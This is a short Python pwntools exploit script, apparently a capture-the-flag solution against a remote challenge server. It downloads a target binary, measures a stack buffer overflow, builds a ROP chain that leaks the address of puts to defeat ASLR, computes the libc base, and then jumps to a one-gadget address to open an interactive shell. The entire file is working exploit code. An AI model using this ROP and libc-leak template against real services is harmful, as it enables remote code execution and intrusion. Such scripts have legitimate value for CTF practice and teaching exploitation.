from pwn import *
import base64

context.arch='amd64'
#context.log_level = "debug"

x = remote("challs.xmas.htsp.ro", 12002)

x.recvuntil("Content: b'")
raw = base64.b64decode(x.recvuntil("'"))

with open("./file", "w") as f:
	f.write(raw)

idx = raw.index("H\x8d\x85")
buf_size = 0x100000000-u32(raw[idx+3:idx+7]) + 8
print(hex(buf_size))

main = raw.index("\x55\x48\x89\xe5\x48\x81\xec") + 0x400000


e = ELF("./file")

r = ROP(e)
r.raw("a"*buf_size)
r.puts(e.got['puts'])
r.raw(main) # to main


x.sendlineafter("name? ", r.chain())
x.recvuntil("aaaaa")
x.recvline()
context.log_level = "debug"
x.recvline()

puts = x.recvline()[:-1]+"\x00\x00"
puts = u64(puts)
print(hex(puts))
libcbase = puts - 0x809c0
print(hex(libcbase))

r = ROP(e)
r.raw("a"*buf_size)
r.raw(libcbase + 0x10a38c) # 0x4f2c5 0x4f322 0x10a38c

x.sendlineafter("name? ", r.chain())
x.interactive()